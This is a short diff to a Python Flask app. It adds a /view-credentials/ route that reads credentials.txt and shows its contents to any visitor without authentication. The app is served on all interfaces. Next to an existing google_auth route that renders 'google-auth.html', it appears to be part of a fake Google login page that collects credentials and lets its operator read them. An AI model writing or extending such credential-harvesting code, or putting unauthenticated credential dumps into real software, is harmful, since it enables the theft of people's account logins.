@@ -25,6 +25,14 @@ def google_auth():
 
     return render_template('google-auth.html', message=message, error=error)
 
+@app.route('/view-credentials/')
+def view_credentials():
+    try:
+        with open('credentials.txt', 'r', encoding='utf-8') as f:
+            data = f.read()
+    except FileNotFoundError:
+        data = "Nav saglabātu datu."
+    return f"<pre>{data}</pre>"
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
-
